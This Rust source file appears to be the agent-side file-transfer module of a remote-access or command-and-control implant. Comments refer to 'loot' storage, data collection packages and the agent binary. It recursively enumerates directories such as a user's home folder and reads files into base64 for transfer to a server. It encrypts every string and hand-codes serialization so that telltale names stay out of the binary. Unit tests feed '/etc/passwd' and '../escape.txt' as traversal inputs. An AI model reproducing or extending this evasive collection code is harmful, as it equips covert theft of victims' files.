// src/file_transfer.rs
//
// Server-side "loot" storage was fully replaced by the RCM data collection
// packages (src/rcm/, SPEC §5): all `file:` wire messages are stored via
// PackageManager in src/server/session.rs. What remains here is the
// AGENT-side file plumbing (enumeration, reading, upload writing) shared by
// the agent and menu code.

use std::fs::File;
use std::io::{Read, Write};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use std::path::{Path, PathBuf, Component};
use serde::{Serialize, Deserialize};

use crate::strcrypt_rt;

use crate::config::config;

/// Serde: positional seq [root_path, total_files_found, total_success,
/// failed_downloads] - manual impl so field names don't leak into the
/// agent binary.
#[derive(Debug)]
pub struct RecursiveReport {
    pub root_path: String,
    pub total_files_found: usize,
    pub total_success: usize,
    pub failed_downloads: Vec<(String, String)>,
}

impl Serialize for RecursiveReport {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        use serde::ser::SerializeSeq;
        let mut seq = serializer.serialize_seq(None)?;
        seq.serialize_element(&self.root_path)?;
        seq.serialize_element(&self.total_files_found)?;
        seq.serialize_element(&self.total_success)?;
        seq.serialize_element(&self.failed_downloads)?;
        seq.end()
    }
}

impl<'de> Deserialize<'de> for RecursiveReport {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct V;
        impl<'de> serde::de::Visitor<'de> for V {
            type Value = RecursiveReport;
            fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result { f.write_str("seq") }
            fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
                Ok(RecursiveReport {
                    root_path: s.next_element()?.ok_or_else(|| serde::de::Error::custom("truncated"))?,
                    total_files_found: s.next_element()?.ok_or_else(|| serde::de::Error::custom("truncated"))?,
                    total_success: s.next_element()?.ok_or_else(|| serde::de::Error::custom("truncated"))?,
                    failed_downloads: s.next_element()?.ok_or_else(|| serde::de::Error::custom("truncated"))?,
                })
            }
        }
        deserializer.deserialize_seq(V)
    }
}

// ── Constants ───────────────────────────────────────────────────────────────
// Size limits now live in the typed config (crate::config::TransferConfig):
// max_file_size_bytes, max_total_file_size_bytes, small_file_threshold_bytes.

/// Create a directory and all its parents, but refuse to follow or create
/// through symlinks. Pre- and post-creation checks catch races.
fn ensure_safe_dir(path: &Path) -> Result<(), String> {
    // Single metadata call eliminates TOCTOU between exists()/is_symlink()/is_dir()
    if let Ok(meta) = path.symlink_metadata() {
        if meta.file_type().is_symlink() {
            return Err(format!("{} {}", strcrypt::aes_str!("Symlink detected at directory:"), path.display()));
        }
        if !meta.is_dir() {
            return Err(format!("{} {}", strcrypt::aes_str!("Path exists but is not a directory:"), path.display()));
        }
        return Ok(());
    }

    if let Some(parent) = path.parent() {
        ensure_safe_dir(parent)?;
    }

    std::fs::create_dir(path).map_err(|e| format!("{} {}", strcrypt::aes_str!("Create dir:"), e))?;

    if let Ok(meta) = path.symlink_metadata() {
        if meta.file_type().is_symlink() {
            return Err(format!("{} {}", strcrypt::aes_str!("Race: symlink detected at directory:"), path.display()));
        }
    }
    Ok(())
}

// ── Hard-link detection helper ───────────────────────────────────────────────

#[cfg(unix)]
fn is_hardlink(meta: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::MetadataExt;
    meta.is_file() && meta.nlink() > 1
}

#[cfg(not(unix))]
fn is_hardlink(_meta: &std::fs::Metadata) -> bool {
    false
}

// ── File enumeration & reading ────────────────────────────────────────────────

pub fn find_all_files(root: &str) -> (Vec<PathBuf>, Vec<String>) {
    let mut files = Vec::new();
    let mut errors = Vec::new();
    let root_path = Path::new(root);
    
    // Eliminate TOCTOU by using a single symlink_metadata call instead of exists()
    let root_meta = match root_path.symlink_metadata() {
        Ok(meta) => meta,
        Err(e) => {
            errors.push(format!("{} {}", strcrypt::aes_str!("Root path does not exist or is inaccessible:"), e));
            return (files, errors);
        }
    };
    if root_meta.file_type().is_symlink() {
        errors.push(format!("{} {}", strcrypt::aes_str!("Root path is a symlink:"), root_path.display()));
        return (files, errors);
    }
    if root_meta.is_file() {
        files.push(root_path.to_path_buf());
        return (files, errors);
    }
    if !root_meta.is_dir() {
        errors.push(format!("{} {}", strcrypt::aes_str!("Root path is not a file or directory:"), root_path.display()));
        return (files, errors);
    }

    let mut dirs_to_visit = vec![root_path.to_path_buf()];

    while let Some(current_dir) = dirs_to_visit.pop() {
        match std::fs::read_dir(&current_dir) {
            Ok(entries) => {
                for entry in entries {
                    match entry {
                        Ok(e) => {
                            let path = e.path();
                            // Use DirEntry::file_type() to avoid following symlinks
                            match e.file_type() {
                                Ok(ft) => {
                                    if ft.is_symlink() {
                                        continue;
                                    }
                                    if ft.is_dir() {
                                        dirs_to_visit.push(path);
                                    } else if ft.is_file() {
                                        files.push(path);
                                    }
                                }
                                Err(e) => {
                                    errors.push(format!("{} {}: {}", strcrypt::aes_str!("Failed to get file type for"), path.display(), e));
                                }
                            }
                        }
                        Err(e) => {
                            errors.push(format!("{} {}: {}", strcrypt::aes_str!("Failed to read entry in"), current_dir.display(), e));
                        }
                    }
                }
            },
            Err(e) => {
                errors.push(format!("{} {}: {}", strcrypt::aes_str!("Failed to read directory"), current_dir.display(), e));
            }
        }
    }
    (files, errors)
}

/// Streaming variant of `find_all_files`.
///
/// Yields each file path to the caller via `callback` as soon as it is
/// discovered, rather than building a massive `Vec<PathBuf>` upfront.
/// This keeps memory usage O(1) with respect to file count - critical
/// for directories such as `C:\Users\<user>` that can contain 500 K+
/// files.
///
/// The callback is invoked synchronously from the walker; if it returns
/// `false` the walk aborts immediately.
///
/// Returns the list of non-fatal errors encountered (permission denied,
/// etc.) after the walk completes or is aborted.
pub fn find_all_files_cb<F>(root: &str, mut callback: F) -> Vec<String>
where
    F: FnMut(&Path) -> bool,
{
    let mut errors = Vec::new();
    let root_path = Path::new(root);

    let root_meta = match root_path.symlink_metadata() {
        Ok(meta) => meta,
        Err(e) => {
            errors.push(format!("{} {}", strcrypt::aes_str!("Root path does not exist or is inaccessible:"), e));
            return errors;
        }
    };
    if root_meta.file_type().is_symlink() {
        errors.push(format!("{} {}", strcrypt::aes_str!("Root path is a symlink:"), root_path.display()));
        return errors;
    }
    if root_meta.is_file() {
        let _ = callback(root_path);
        return errors;
    }
    if !root_meta.is_dir() {
        errors.push(format!("{} {}", strcrypt::aes_str!("Root path is not a file or directory:"), root_path.display()));
        return errors;
    }

    let mut dirs_to_visit = vec![root_path.to_path_buf()];

    while let Some(current_dir) = dirs_to_visit.pop() {
        match std::fs::read_dir(&current_dir) {
            Ok(entries) => {
                for entry in entries {
                    match entry {
                        Ok(e) => {
                            let path = e.path();
                            match e.file_type() {
                                Ok(ft) => {
                                    if ft.is_symlink() {
                                        continue;
                                    }
                                    if ft.is_dir() {
                                        dirs_to_visit.push(path);
                                    } else if ft.is_file() {
                                        if !callback(&path) {
                                            return errors; // caller aborted
                                        }
                                    }
                                }
                                Err(e) => {
                                    errors.push(format!(
                                        "{} {}: {}",
                                        strcrypt::aes_str!("Failed to get file type for"), path.display(), e
                                    ));
                                }
                            }
                        }
                        Err(e) => {
                            errors.push(format!(
                                "{} {}: {}",
                                strcrypt::aes_str!("Failed to read entry in"), current_dir.display(), e
                            ));
                        }
                    }
                }
            }
            Err(e) => {
                errors.push(format!(
                    "{} {}: {}",
                    strcrypt::aes_str!("Failed to read directory"), current_dir.display(), e
                ));
            }
        }
    }
    errors
}

pub fn read_file_to_b64(path: &str) -> Result<(String, String), String> {
    let path_obj = Path::new(path);
    if !path_obj.exists() { return Err(format!("{} {:?}", strcrypt::aes_str!("File not found:"), path)); }

    if let Ok(meta) = path_obj.symlink_metadata() {
        if meta.file_type().is_symlink() {
            return Err(format!("{} {:?}", strcrypt::aes_str!("Symlink detected:"), path));
        }
    }

    let meta = std::fs::metadata(path_obj).map_err(|e| e.to_string())?;
    let perm_string = if meta.permissions().readonly() { strcrypt::aes_str!("readonly") } else { strcrypt::aes_str!("writable") };

    let mut file = File::open(path_obj).map_err(|e| e.to_string())?;
    let file_size_u64 = meta.len();

    // Fetch the limits once: this function is a single-shot read, not a loop.
    let max_file_size = config().transfer.max_file_size_bytes;
    if file_size_u64 > max_file_size {
        return Err(format!("{}{}{}{}{}",
            strcrypt::aes_str!("File too large ("), file_size_u64 / (1024 * 1024),
            strcrypt::aes_str!(" MB). Max is "), max_file_size / (1024 * 1024),
            strcrypt::aes_str!(" MB.")));
    }

    if file_size_u64 < config().transfer.small_file_threshold_bytes {
        let cap = (file_size_u64 as usize).max(4096);
        let mut buffer = Vec::with_capacity(cap);
        let bytes_read = if file_size_u64 == 0 {
            file.take(10 * 1024 * 1024).read_to_end(&mut buffer).map_err(|e| e.to_string())?
        } else {
            file.take(file_size_u64 + 1).read_to_end(&mut buffer).map_err(|e| e.to_string())?
        };
        // Detect files that changed size between metadata() and read
        if file_size_u64 > 0 && bytes_read as u64 != file_size_u64 {
            return Err(format!("{} {} {} {}", strcrypt::aes_str!("File size changed during read: expected"), file_size_u64, strcrypt::aes_str!("got"), bytes_read));
        }
        return Ok((BASE64.encode(buffer), perm_string));
    }

    use base64::engine::general_purpose::STANDARD as B64;
    let file_size = file_size_u64 as usize;
    let prealloc = (file_size * 4 / 3 + 4).min(32 * 1024 * 1024);
    let mut b64_output = String::with_capacity(prealloc);
    let mut chunk = vec![0u8; 3 * 1024 * 1024];
    let mut carry: Vec<u8> = Vec::new();
    let mut total_read: u64 = 0;

    loop {
        let n = file.read(&mut chunk).map_err(|e| e.to_string())?;
        if n == 0 {
            if !carry.is_empty() {
                b64_output.push_str(&B64.encode(&carry));
            }
            break;
        }

        total_read += n as u64;
        if total_read > max_file_size {
            return Err(format!("{} {} {}", strcrypt::aes_str!("File exceeded"),
                max_file_size / (1024 * 1024), strcrypt::aes_str!("MB during read (possible infinite stream)")));
        }

        let mut combined = std::mem::take(&mut carry);
        combined.extend_from_slice(&chunk[..n]);

        let aligned = (combined.len() / 3) * 3;
        b64_output.push_str(&B64.encode(&combined[..aligned]));

        carry = combined[aligned..].to_vec();
    }
    Ok((b64_output, perm_string))
}

/// Write a decoded file relative to `base_dir`. The path must be relative and
/// must not escape `base_dir`. Symlinks and hard links are rejected.
pub fn write_file_simple(base_dir: &str, rel_path: &str, b64_data: &str) -> Result<(), String> {
    // Reject paths with parent traversal or absolute components
    for component in Path::new(rel_path).components() {
        match component {
            Component::ParentDir => {
                return Err(strcrypt::aes_str!("Path contains parent traversal (..)"));
            }
            Component::Prefix(_) | Component::RootDir => {
                return Err(strcrypt::aes_str!("Path must be relative"));
            }
            _ => {}
        }
    }
    if rel_path.is_empty() || rel_path == "." {
        return Err(strcrypt::aes_str!("Invalid path"));
    }

    // Canonicalize the base directory and use it for all operations
    let base = Path::new(base_dir);
    std::fs::create_dir_all(base).map_err(|e| format!("{} {}", strcrypt::aes_str!("Create base dir:"), e))?;
    let canonical_base = std::fs::canonicalize(base)
        .map_err(|e| format!("{} {}", strcrypt::aes_str!("Cannot canonicalize base dir:"), e))?;
    
    let full_path = canonical_base.join(rel_path);

    // Ensure parent directory exists and is safe
    if let Some(parent) = full_path.parent() {
        ensure_safe_dir(parent)?;
    }

    // Verify the resolved path stays inside base_dir
    let canonical_target = std::fs::canonicalize(&full_path)
        .or_else(|_| {
            full_path.parent()
                .map(|p| std::fs::canonicalize(p))
                .unwrap_or_else(|| Ok(canonical_base.clone()))
        })
        .map_err(|e| format!("{} {}", strcrypt::aes_str!("Cannot canonicalize target:"), e))?;
    if !canonical_target.starts_with(&canonical_base) {
        return Err(strcrypt::aes_str!("Path escapes base directory"));
    }

    // Race-harden: refuse to open if the path is a symlink or hard link
    if let Ok(meta) = full_path.symlink_metadata() {
        if meta.file_type().is_symlink() {
            return Err(strcrypt::aes_str!("Symlink detected at target path"));
        }
        if is_hardlink(&meta) {
            return Err(strcrypt::aes_str!("Hard link detected at target path"));
        }
    }

    let bytes = BASE64.decode(b64_data).map_err(|e| format!("{} {}", strcrypt::aes_str!("B64 Error:"), e))?;
    // Enforce decoded size limit
    let max_total = config().transfer.max_total_file_size_bytes;
    if bytes.len() as u64 > max_total {
        return Err(format!("{} {} {}", strcrypt::aes_str!("Decoded file exceeds"), max_total / (1024 * 1024), strcrypt::aes_str!("MB limit")));
    }
    let mut file = File::create(&full_path).map_err(|e| e.to_string())?;
    file.write_all(&bytes).map_err(|e| e.to_string())?;
    Ok(())
}

// ── Unit tests ────────────────────────────────────────────────────────────────
// The save_file_chunk unit tests retired with the old loot storage; the RCM
// coverage lives in tests/test_download.rs / tests/test_recursive_download.rs.
#[cfg(test)]
mod write_file_simple_tests {
    use super::*;

    #[test]
    fn write_file_simple_rejects_absolute_path() {
        let r = write_file_simple("downloads", "/etc/passwd", &BASE64.encode(b"x"));
        assert!(r.is_err(), "absolute path must be rejected");
    }

    #[test]
    fn write_file_simple_rejects_traversal() {
        let r = write_file_simple("downloads", "../escape.txt", &BASE64.encode(b"x"));
        assert!(r.is_err(), "parent traversal must be rejected");
    }
}